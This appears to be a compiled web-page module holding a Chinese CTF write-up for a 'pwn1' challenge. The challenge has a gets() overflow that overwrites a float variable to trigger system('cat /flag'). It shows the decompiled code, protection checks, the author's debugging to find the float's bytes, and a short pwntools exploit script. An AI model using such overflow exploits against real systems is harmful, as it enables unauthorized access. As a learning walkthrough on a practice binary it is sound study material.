import{_ as n}from"./plugin-vue_export-helper-x3n3nnut.js";import{o as s,c as a,e as t}from"./app-HpUR10YL.js";const e={},p=t(`<h1 id="siscn-pwn1-栈迁移-float数据格式" tabindex="-1"><a class="header-anchor" href="#siscn-pwn1-栈迁移-float数据格式" aria-hidden="true">#</a> siscn_pwn1(栈迁移+float数据格式)</h1><blockquote><p>看一下题发现应该是比较简单的 由于有个gets函数 所以我有点想直接覆盖数据为11.28125</p></blockquote><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token keyword">int</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> v1<span class="token punctuation">[</span><span class="token number">44</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h] BYREF</span>
  <span class="token keyword">float</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+2Ch] [rbp-4h]</span>

  v2 <span class="token operator">=</span> <span class="token number">0.0</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;Let&#39;s guess the number.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token number">11.28125</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">&quot;cat /flag&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">else</span>
    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;Its value should be 11.28125&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>保护</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">&#39;/home/agentalbrazee/work/ctf/pwn/cp/nssctf/pwn1/pwn1&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="实验float的存储数据" tabindex="-1"><a class="header-anchor" href="#实验float的存储数据" aria-hidden="true">#</a> 实验float的存储数据</h2><blockquote><p>为了实验一下 我们手搓一个程序 gdb调试一下</p></blockquote><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">float</span> a<span class="token punctuation">;</span>
    a <span class="token operator">=</span> <span class="token number">11.28125</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;The value of a is %f\\n&quot;</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><p>获取结果:</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>► 0x5555555551c7 <span class="token operator">&lt;</span>main+6<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>    call   __isoc99_scanf@plt                <span class="token operator">&lt;</span>__isoc99_scanf@plt<span class="token operator">&gt;</span>
        format: 0x555555556004 ◂— 0x7620656854006625 /* <span class="token string">&#39;%f&#39;</span> */
        vararg: 0x7fffffffdee4 ◂— 0xc7df9b0041348000

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>那么我们就知道了 这里的存储数据为0xc7df9b0041348000</p></li><li><p>但是好像显然不太对所以我们这里干脆用idapython在ida里面提取出来</p></li></ul><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">float</span> v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+2Ch] [rbp-4h] BYREF</span>

  <span class="token function">_main</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v4 <span class="token operator">=</span> <span class="token number">11.28125</span><span class="token punctuation">;</span>
  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">&quot;%f&quot;</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;The value of a is %f\\n&quot;</span><span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><p>然后在scanf里面下idapython脚本:</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> idc
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;rax&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>idc<span class="token punctuation">.</span>get_reg_value<span class="token punctuation">(</span><span class="token string">&quot;rax&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>获取数据:rax 0x61fe1c 好像还是不太对</p></li><li><p>(太笨了)最后我们直接在程序源代码重找cmp的部分找到了</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>.rodata:00000000004007F4 00 <span class="token number">80</span> <span class="token number">34</span> <span class="token number">41</span>                   dword_4007F4 <span class="token function">dd</span> 41348000h  
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></li></ul><h2 id="尝试覆盖" tabindex="-1"><a class="header-anchor" href="#尝试覆盖" aria-hidden="true">#</a> 尝试覆盖</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># r = remote(&quot;node5.anna.nssctf.cn&quot;,28355)</span>
r <span class="token operator">=</span> gdb<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token string">&quot;./pwn1&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;b main&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b&quot;Let&#39;s guess the number.\\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x41348000</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>最后成功</li></ul>`,14),o=[p];function c(i,l){return s(),a("div",null,o)}const d=n(e,[["render",c],["__file","siscn_pwn1(栈迁移_float数据格式).html.vue"]]);export{d as default};
